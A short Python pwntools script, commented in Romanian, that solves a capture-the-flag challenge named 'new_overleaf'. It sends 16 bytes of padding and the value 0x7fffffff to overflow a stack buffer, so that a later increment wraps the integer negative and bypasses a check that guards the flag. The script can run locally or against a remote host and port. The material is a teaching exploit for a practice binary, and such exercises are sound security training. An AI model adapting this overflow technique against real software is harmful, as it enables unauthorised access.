#!/usr/bin/env python3
# ============================================================================
# CTF: new_overleaf — stack BOF + integer overflow semnat
# Vulnerabilitate: overflow (16 bytes) suprascrie o valoare cu 0x7fffffff (INT_MAX);
#   un +1 ulterior in program o face negativa, trecand de un check care altfel
#   blocheaza accesul la flag.
# Binar: ELF 32-bit (i386), not stripped | NX on · fara canary · No-PIE · Partial RELRO
#   - Esenta e integer overflow printr-un buffer overflow; protectiile anti-ROP nu
#     conteaza fiindca nu redirectezi executia, doar manipulezi o valoare controlata.
# ============================================================================
import sys
import re
from pwn import *

context.binary = elf = ELF('./new_overleaf')
context.log_level = 'error'          # scoate zgomotul pwntools

def connect():
    # remote doar daca ai dat HOST + PORT numeric; altfel proces local
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./new_overleaf')

p = connect()

payload = b'A' * 16
payload += p32(0x7fffffff); # ca gen + 1 da negativ

p.recvuntil(b"infinity")
p.sendline(payload)

out = p.recvall(timeout=2)
# cauta un flag care incepe cu CTF, SI sau FLAG; daca nu-l gaseste, arata output-ul brut
flag = re.search(rb"(CTF|SI|FLAG)\{[^}]*\}", out)
print(flag.group().decode() if flag else out)
